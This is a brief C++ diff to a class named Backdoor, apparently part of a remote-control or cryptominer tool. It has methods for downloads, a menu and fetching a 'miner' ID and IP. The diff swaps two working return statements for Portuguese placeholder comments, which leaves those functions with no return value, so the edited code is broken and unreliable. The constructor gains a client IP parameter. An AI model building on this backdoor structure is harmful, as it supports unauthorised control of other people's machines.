@@ -28,12 +28,12 @@ void Backdoor::download(char *path){
 
 
 std::string Backdoor::get_miner_id(){
-    return c->connection_id();
+    // Logica para pegar ID
 }
 
 
 std::string Backdoor::get_miner_ip(){
-    return c->connection_ip();
+    // Logica para pegar IP
 }
 
 
@@ -69,9 +69,9 @@ void Backdoor::menu(){
 }
 
 
-Backdoor::Backdoor(int sock, Communication *c, bool is_server){
+Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
     this->sock = sock;
     this->c  = c;
     this->is_server = is_server;
-
+    this->client_ip = ip;
 }
